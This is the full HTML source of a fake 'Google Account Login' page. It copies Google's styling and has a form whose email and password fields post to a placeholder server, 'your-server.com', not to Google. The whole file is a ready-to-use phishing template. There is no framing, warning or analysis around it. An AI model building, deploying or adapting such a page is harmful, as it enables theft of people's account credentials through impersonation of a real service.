<!DOCTYPE html>
<html>
<head>
    <title>Google Account Login</title>
    <style>
        body { font-family: Arial, sans-serif; }
        .login-form { width: 300px; margin: 0 auto; }
        .login-form input { width: 100%; padding: 10px; margin: 10px 0; }
        .login-form button { width: 100%; padding: 10px; background-color: #4285F4; color: white; border: none; cursor: pointer; }
        .login-form button:hover { background-color: #357ae8; }
    </style>
</head>
<body>
    <div class="login-form">
        <h2>Google Account Login</h2>
        <form action="https://your-server.com/login" method="post">
            <input type="text" name="email" placeholder="Email" required><br>
            <input type="password" name="password" placeholder="Password" required><br>
            <button type="submit">Login</button>
        </form>
    </div>
</body>
</html>
